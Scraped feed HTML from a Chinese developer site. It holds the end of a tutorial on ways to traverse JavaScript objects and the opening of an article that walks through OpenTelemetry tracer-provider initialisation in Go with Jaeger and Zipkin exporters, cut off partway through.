  <span class="hljs-attr">isVip</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">hobbies</span>: [<span class="hljs-string">"coding"</span>, <span class="hljs-string">"writing"</span>],
  <span class="hljs-comment">// 方法</span>
  <span class="hljs-attr">sayHello</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"Hello, Juejin!"</span>);
  }
};

<span class="hljs-comment">// 原型链上的属性（用于后续演示区别）</span>
<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">protoProp</span> = <span class="hljs-string">"我是原型链上的属性"</span>;
</code></pre>
<h3 data-id="heading-2">二、常用对象遍历方法（按使用频率排序）</h3>
<p>以下方法是开发中最常用的，重点掌握前 4 种，基本能覆盖 90%+ 的业务场景。</p>
<h4 data-id="heading-3">1. for...in 循环（最基础，遍历可枚举属性）</h4>
<p><code>for...in</code> 是最早的对象遍历方法，也是最基础的方式，它会遍历对象<strong>自身的可枚举属性</strong>和<strong>原型链上的可枚举属性</strong>（这是它的坑点，也是重点注意事项）。</p>
<h5 data-id="heading-4">基础用法</h5>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// for...in 遍历对象</span>
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> user) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"键："</span>, key); <span class="hljs-comment">// 输出对象的键</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"值："</span>, user[key]); <span class="hljs-comment">// 输出对应的值</span>
}
</code></pre>
<h5 data-id="heading-5">输出结果（重点看最后一行）</h5>
<pre><code class="hljs language-js" lang="js">键： name，值： 掘金小册
键： age，值： <span class="hljs-number">3</span>
键： gender，值： male
键： isVip，值： <span class="hljs-literal">true</span>
键： hobbies，值： [ <span class="hljs-string">'coding'</span>, <span class="hljs-string">'writing'</span> ]
键： sayHello，值： [<span class="hljs-title class_">Function</span>: sayHello]
键： protoProp，值： 我是原型链上的属性
</code></pre>
<h5 data-id="heading-6">核心注意事项（避坑关键）</h5>
<ul>
<li>会遍历原型链上的可枚举属性（如上面的 <code>protoProp</code>），这通常不是我们想要的，所以一定要搭配 <code>hasOwnProperty()</code> 使用。</li>
<li>不能遍历 Symbol 类型的键（后文会讲专门遍历 Symbol 的方法）。</li>
</ul>
<h5 data-id="heading-7">正确用法（搭配 hasOwnProperty）</h5>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> user) {
  <span class="hljs-comment">// 只遍历对象自身的属性，过滤原型链属性</span>
  <span class="hljs-keyword">if</span> (user.<span class="hljs-title function_">hasOwnProperty</span>(key)) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"键："</span>, key, <span class="hljs-string">"值："</span>, user[key]);
  }
}
</code></pre>
<p>这样就不会输出原型链上的 <code>protoProp</code> 了，这是 <code>for...in</code> 的标准用法。</p>
<h4 data-id="heading-8">2. Object.keys() + forEach（最常用，遍历自身可枚举键）</h4>
<p>ES5 新增的 <code>Object.keys()</code> 方法，会返回一个包含对象<strong>自身可枚举属性键</strong>的数组（不包含原型链属性，也不包含 Symbol 键），再搭配 <code>forEach</code> 循环，是目前开发中最常用的遍历方式。</p>
<h5 data-id="heading-9">基础用法</h5>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 1. 获取对象自身的所有可枚举键，返回数组</span>
<span class="hljs-keyword">const</span> keys = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(user);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(keys); <span class="hljs-comment">// 输出：['name', 'age', 'gender', 'isVip', 'hobbies', 'sayHello']</span>

<span class="hljs-comment">// 2. 搭配 forEach 遍历</span>
<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(user).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">key</span> =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"键："</span>, key);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"值："</span>, user[key]);
});
</code></pre>
<h5 data-id="heading-10">核心优势</h5>
<ul>
<li>自动过滤原型链属性，无需手动写 <code>hasOwnProperty()</code>，更简洁、更安全。</li>
<li>返回的是数组，可直接使用数组的方法（如 <code>forEach</code>、<code>map</code>、<code>filter</code> 等），灵活度更高。</li>
</ul>
<h5 data-id="heading-11">实战场景</h5>
<p>筛选对象中值为布尔类型的键值对：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> boolProps = {};
<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(user).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">key</span> =&gt;</span> {
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> user[key] === <span class="hljs-string">"boolean"</span>) {
    boolProps[key] = user[key];
  }
});
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(boolProps); <span class="hljs-comment">// 输出：{ isVip: true }</span>
</code></pre>
<h4 data-id="heading-12">3. Object.values() + forEach（遍历自身可枚举值）</h4>
<p>ES2017（ES8）新增的 <code>Object.values()</code> 方法，和 <code>Object.keys()</code> 对应，它会返回一个包含对象<strong>自身可枚举属性值</strong>的数组（不包含原型链属性、Symbol 键对应的值）。</p>
<h5 data-id="heading-13">基础用法</h5>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 获取对象自身的所有可枚举值，返回数组</span>
<span class="hljs-keyword">const</span> values = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">values</span>(user);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(values); 
<span class="hljs-comment">// 输出：['掘金小册', 3, 'male', true, ['coding', 'writing'], [Function: sayHello]]</span>

<span class="hljs-comment">// 搭配 forEach 遍历值</span>
<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">values</span>(user).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"值："</span>, value);
});
</code></pre>
<h5 data-id="heading-14">实战场景</h5>
<p>统计对象中所有数值类型的值的总和：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> sum = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">values</span>(user).<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">total, value</span>) =&gt;</span> {
  <span class="hljs-comment">// 只累加数值类型的值</span>
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">typeof</span> value === <span class="hljs-string">"number"</span> ? total + value : total;
}, <span class="hljs-number">0</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(sum); <span class="hljs-comment">// 输出：3</span>
</code></pre>
<h4 data-id="heading-15">4. Object.entries() + forEach（遍历自身可枚举键值对）</h4>
<p>同样是 ES2017 新增的方法，<code>Object.entries()</code> 是最灵活的遍历方法，它会返回一个包含对象<strong>自身可枚举键值对</strong>的二维数组（每个子数组是 [key, value]），完美兼顾键和值的获取。</p>
<h5 data-id="heading-16">基础用法</h5>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 获取对象自身的所有可枚举键值对，返回二维数组</span>
<span class="hljs-keyword">const</span> entries = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">entries</span>(user);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(entries);
<span class="hljs-comment">// 输出：[</span>
<span class="hljs-comment">//   ['name', '掘金小册'],</span>
<span class="hljs-comment">//   ['age', 3],</span>
<span class="hljs-comment">//   ...</span>
<span class="hljs-comment">// ]</span>

<span class="hljs-comment">// 搭配 forEach 遍历键值对</span>
<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">entries</span>(user).<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">[key, value]</span>) =&gt;</span> {
  <span class="hljs-comment">// 解构赋值，直接获取 key 和 value，更简洁</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`键：<span class="hljs-subst">${key}</span>，值：<span class="hljs-subst">${value}</span>`</span>);
});
</code></pre>
<h5 data-id="heading-17">实战场景</h5>
<p>将对象转换为 Map（Map 支持更多灵活操作）：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// Object.entries() 可直接作为 Map 的构造参数</span>
<span class="hljs-keyword">const</span> userMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">entries</span>(user));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(userMap.<span class="hljs-title function_">get</span>(<span class="hljs-string">"name"</span>)); <span class="hljs-comment">// 输出：掘金小册</span>

<span class="hljs-comment">// 遍历 Map（补充）</span>
userMap.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">value, key</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"键："</span>, key, <span class="hljs-string">"值："</span>, value);
});
</code></pre>
<h4 data-id="heading-18">5. 进阶：遍历 Symbol 类型的键</h4>
<p>如果对象的键是 Symbol 类型（ES6 新增，用于表示唯一键），上面的 4 种方法都无法遍历到，此时需要使用 <code>Object.getOwnPropertySymbols()</code> 方法。</p>
<h5 data-id="heading-19">示例用法</h5>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 定义一个包含 Symbol 键的对象</span>
<span class="hljs-keyword">const</span> obj = {
  [<span class="hljs-title class_">Symbol</span>(<span class="hljs-string">"id"</span>)]: <span class="hljs-number">123</span>,
  <span class="hljs-attr">name</span>: <span class="hljs-string">"测试"</span>
};

<span class="hljs-comment">// 遍历 Symbol 类型的键</span>
<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertySymbols</span>(obj).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">symbolKey</span> =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"Symbol 键："</span>, symbolKey);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"对应值："</span>, obj[symbolKey]); <span class="hljs-comment">// 输出：123</span>
});
</code></pre>
<h4 data-id="heading-20">6. 高阶：遍历所有属性（自身+原型链，可枚举+不可枚举）</h4>
<p>开发中很少用到，但面试可能会问——如果需要遍历对象<strong>自身的所有属性</strong>（包括不可枚举），或者<strong>原型链上的所有属性</strong>，可以使用以下方法：</p>
<ul>
<li><code>Object.getOwnPropertyNames(obj)</code>：返回对象自身的所有属性键（包括不可枚举，不包括 Symbol）。</li>
<li><code>Reflect.ownKeys(obj)</code>：返回对象自身的所有属性键（包括不可枚举、Symbol 键），相当于 <code>Object.keys(obj) + Object.getOwnPropertySymbols(obj) + 不可枚举键</code>。</li>
</ul>
<h5 data-id="heading-21">示例</h5>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 遍历自身所有属性（包括不可枚举）</span>
<span class="hljs-keyword">const</span> allOwnKeys = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertyNames</span>(user);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(allOwnKeys); <span class="hljs-comment">// 包含 sayHello（函数也是属性）</span>

<span class="hljs-comment">// 遍历自身所有属性（包括不可枚举、Symbol）</span>
<span class="hljs-keyword">const</span> allKeys = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">ownKeys</span>(user);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(allKeys);
</code></pre>
<h3 data-id="heading-22">三、常用方法对比表（一目了然）</h3>





























































<table><thead><tr><th>方法</th><th>遍历范围</th><th>是否包含原型链</th><th>是否包含 Symbol 键</th><th>是否包含不可枚举</th><th>适用场景</th></tr></thead><tbody><tr><td>for...in</td><td>自身可枚举 + 原型链可枚举</td><td>是（需手动过滤）</td><td>否</td><td>否</td><td>兼容旧环境，需过滤原型链</td></tr><tr><td>Object.keys()</td><td>自身可枚举键</td><td>否</td><td>否</td><td>否</td><td>仅需获取键，搭配数组方法</td></tr><tr><td>Object.values()</td><td>自身可枚举值</td><td>否</td><td>否</td><td>否</td><td>仅需获取值，如统计、筛选</td></tr><tr><td>Object.entries()</td><td>自身可枚举键值对</td><td>否</td><td>否</td><td>否</td><td>需同时操作键和值（最常用）</td></tr><tr><td>Object.getOwnPropertySymbols()</td><td>自身 Symbol 键</td><td>否</td><td>是</td><td>否</td><td>遍历 Symbol 类型的键</td></tr><tr><td>Reflect.ownKeys()</td><td>自身所有键（可枚举+不可枚举+Symbol）</td><td>否</td><td>是</td><td>是</td><td>高阶场景，需获取所有自身属性</td></tr></tbody></table>
<h3 data-id="heading-23">四、避坑指南（新手必看）</h3>
<ol>
<li>永远不要用 <code>for...in</code> 遍历数组！虽然数组也是对象，但 <code>for...in</code> 会遍历数组的原型链属性，还会按照“字符串索引”排序，导致遍历顺序错乱。</li>
<li>使用 <code>for...in</code> 必须搭配 <code>hasOwnProperty()</code>，否则会遍历到原型链上的无关属性，导致业务逻辑出错。</li>
<li>Symbol 类型的键无法被 <code>Object.keys()</code>、<code>Object.values()</code>、<code>for...in</code> 遍历，需用专门的 <code>Object.getOwnPropertySymbols()</code>。</li>
<li>对象是无序的！虽然 ES6 后对象的键会按照“数字优先、插入顺序”排列，但不要依赖对象的遍历顺序来实现业务逻辑（如需有序，建议用 Map）。</li>
</ol>
<h3 data-id="heading-24">五、实战案例（综合运用）</h3>
<p>需求：遍历一个用户对象，筛选出所有非函数类型的属性，将其转换为查询字符串（如：name=掘金小册&amp;age=3）。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> user = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">"掘金小册"</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">3</span>,
  <span class="hljs-attr">gender</span>: <span class="hljs-string">"male"</span>,
  <span class="hljs-attr">isVip</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">sayHello</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"Hello"</span>);
  }
};

<span class="hljs-comment">// 1. 遍历对象，筛选非函数属性</span>
<span class="hljs-keyword">const</span> queryArr = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">entries</span>(user).<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">[key, value]</span>) =&gt;</span> {
  <span class="hljs-comment">// 排除函数类型的属性</span>
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">typeof</span> value !== <span class="hljs-string">"function"</span>;
}).<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">[key, value]</span>) =&gt;</span> {
  <span class="hljs-comment">// 将键值对转换为 "key=value" 格式</span>
  <span class="hljs-keyword">return</span> <span class="hljs-string">`<span class="hljs-subst">${key}</span>=<span class="hljs-subst">${<span class="hljs-built_in">encodeURIComponent</span>(value)}</span>`</span>;
});

<span class="hljs-comment">// 2. 拼接为查询字符串</span>
<span class="hljs-keyword">const</span> queryStr = queryArr.<span class="hljs-title function_">join</span>(<span class="hljs-string">"&amp;"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(queryStr);
<span class="hljs-comment">// 输出：name=掘金小册&amp;age=3&amp;gender=male&amp;isVip=true</span>
</code></pre>
<p>解析：这里结合了 <code>Object.entries()</code>、<code>filter()</code>、<code>map()</code> 方法，既遍历了键值对，又完成了筛选和格式转换，是开发中非常典型的场景。</p>
<h3 data-id="heading-25">六、总结</h3>
<p>JS 对象遍历的核心是“明确遍历范围”——你是要遍历自身属性，还是原型链属性？是要键、值，还是键值对？是包含 Symbol 或不可枚举属性？</p>
<p>对于绝大多数开发场景：</p>
<ul>
<li>仅需键 → 用 <code>Object.keys()</code></li>
<li>仅需值 → 用 <code>Object.values()</code></li>
<li>需键值对 → 用 <code>Object.entries()</code>（最常用）</li>
<li>兼容旧环境 → 用 <code>for...in + hasOwnProperty()</code></li>
</ul>
<p>最后，祝大家在 JS 的世界里，遍历无坑，编码无忧！🚀</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[深入 OpenTelemetry 源码与实战（上篇）]]></title>    <link>https://juejin.cn/post/7602825342229348386</link>    <guid>https://juejin.cn/post/7602825342229348386</guid>    <pubDate>2026-02-05T04:34:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602825342229348386" data-draft-id="7602846823326990371" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="深入 OpenTelemetry 源码与实战（上篇）"/> <meta itemprop="keywords" content="后端,Go"/> <meta itemprop="datePublished" content="2026-02-05T04:34:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="下次一定57"/> <meta itemprop="url" content="https://juejin.cn/user/3722294009017404"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            深入 OpenTelemetry 源码与实战（上篇）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3722294009017404/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    下次一定57
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T04:34:54.000Z" title="Thu Feb 05 2026 04:34:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读19分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">引言</h2>
<p>在分布式系统中，链路追踪是排查问题、优化性能的核心利器，而 <code>OpenTelemetry</code> 作为可观测性领域的标准，为我们提供了统一的追踪方案。 很多开发者在使用 <code>OpenTelemetry</code> 时，往往只是“复制粘贴代码”，既不清楚底层运行流程，也无法应对后续的定制化需求（比如更换追踪后端、调整采样策略）。更重要的是，<code>OpenTelemetry</code> 的 Go 实现中蕴含了大量经典的 Go 编程思想（面向接口、选项模式、协程安全等），吃透它不仅能搞定链路追踪，更能提升自身的 Go 编程功底。 本篇作为上篇，将聚焦 <code>OpenTelemetry</code> 追踪的<strong>核心初始化流程</strong>，带着大家逐行拆解初始化源码，搞懂每一个配置、每一个函数的底层逻辑。我们会重点掌握 <code>TracerProvider</code> 的构建、采样策略的实现、追踪后端（<code>Jaeger</code> / <code>Zipkin</code>）的注册等核心内容，同时记住关键结构体和常量的含义，为下篇的实战落地打下坚实基础。</p>
<h2 data-id="heading-1">从源码入手，搭建 <code>OpenTelemetry</code> 追踪基础框架</h2>
<p>对于这段案例，会带着大家深入源码，理解每一步在做什么，这样大家在用的时候会少一些疑惑，不会用完就忘，清晰了解它的运行流程，更重要的是阅读源码会学到很多编程规范，了解go语言的编程思想。</p>
<p>当看这段代码看不懂没关系，后面主要是对这些代码的展开，但大家要记住的是 <code>Options</code> 结构体是我们赋值的，每个字段希望大家能记住，后续用到的时候大家也可以回过头来看一下代表什么意思，还有我自己定义的这些常量和变量，后续会用到</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> trace

<span class="hljs-keyword">import</span> (
	<span class="hljs-string">"go.opentelemetry.io/otel"</span>
	<span class="hljs-string">"go.opentelemetry.io/otel/exporters/jaeger"</span>
	<span class="hljs-string">"go.opentelemetry.io/otel/exporters/zipkin"</span>
	<span class="hljs-string">"go.opentelemetry.io/otel/propagation"</span>
	<span class="hljs-string">"go.opentelemetry.io/otel/sdk/resource"</span>
	<span class="hljs-string">"go.opentelemetry.io/otel/sdk/trace"</span>
	semconv <span class="hljs-string">"go.opentelemetry.io/otel/semconv/v1.38.0"</span>

	<span class="hljs-string">"log"</span>
)

<span class="hljs-keyword">type</span> Options <span class="hljs-keyword">struct</span> {
    Name     <span class="hljs-type">string</span>  <span class="hljs-string">`json:"name"`</span>      <span class="hljs-comment">// 服务名称，会显示在 Jaeger/Zipkin UI 中</span>
    Endpoint <span class="hljs-type">string</span>  <span class="hljs-string">`json:"endpoint"`</span>  <span class="hljs-comment">// 收集器地址 如果是 jaeger 我们填的就是http://jaeger:14268/api/traces</span>
    Sampler  <span class="hljs-type">float64</span> <span class="hljs-string">`json:"sampler"`</span>   <span class="hljs-comment">// 采样率，0.0~1.0</span>
    Batcher  <span class="hljs-type">string</span>  <span class="hljs-string">`json:"batcher"`</span>   <span class="hljs-comment">// 后端类型: "jaeger" 或 "zipkin" 这个字段决定 Endpoint字段填什么</span>
}

<span class="hljs-comment">// 比如我们的系统现在只支持这两个 你传来的 Batcher 这个字段必须在这里面</span>
<span class="hljs-keyword">const</span> (  
	kindJaeger = <span class="hljs-string">"jaeger"</span>
	kindZipkin = <span class="hljs-string">"zipkin"</span>
)

<span class="hljs-comment">// 初始化函数</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">InitTracerProvider</span><span class="hljs-params">(o Options)</span></span> (*trace.TracerProvider,<span class="hljs-type">error</span>) {
	<span class="hljs-keyword">var</span> sexp trace.SpanExporter
	<span class="hljs-keyword">var</span> err <span class="hljs-type">error</span>
	
    <span class="hljs-comment">// 经典 构造选项</span>
	opts := []trace.TracerProviderOption{
        <span class="hljs-comment">// 下面先从这个函数介绍 从内到外</span>
        trace.WithResource(resource.NewSchemaless(semconv.ServiceNameKey.String(o.Name))),
		trace.WithSampler(trace.ParentBased(trace.TraceIDRatioBased(o.Sampler))),

	}

	<span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(o.Endpoint) &gt; <span class="hljs-number">0</span> {
		<span class="hljs-keyword">switch</span> o.Batcher {
		<span class="hljs-keyword">case</span> kindJaeger:
			sexp, err = jaeger.New(jaeger.WithCollectorEndpoint(jaeger.WithEndpoint(o.Endpoint)))
			<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
				<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err
			}
		<span class="hljs-keyword">case</span> kindZipkin:
			sexp, err = zipkin.New(o.Endpoint)
			<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
				<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err
			}
		}
		opts = <span class="hljs-built_in">append</span>(opts, trace.WithBatcher(sexp))
	}

	tp := trace.NewTracerProvider(opts...)
	otel.SetTracerProvider(tp)
	otel.SetTextMapPropagator(propagation.NewCompositeTextMapPropagator(propagation.TraceContext{}, propagation.Baggage{}))
	otel.SetErrorHandler(otel.ErrorHandlerFunc(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(err <span class="hljs-type">error</span>)</span></span> {
		log.Printf(<span class="hljs-string">"[otel] error: %v"</span>, err)
	}))
	<span class="hljs-keyword">return</span> tp, <span class="hljs-literal">nil</span>
}
</code></pre>
<h3 data-id="heading-2"><code>semconv.ServiceNameKey.String(o.Name))</code> 函数讲解</h3>
<p>这个函数本质上就是把全局的 <code>service.name</code> 赋值上，返回的结构体 <code>KeyValue</code>  正是 <code>NewSchemaless()</code> 函数需要的</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">const</span> ServiceNameKey = attribute.Key(<span class="hljs-string">"service.name"</span>)

<span class="hljs-comment">// 再 attribute 这个包下定义的 key</span>
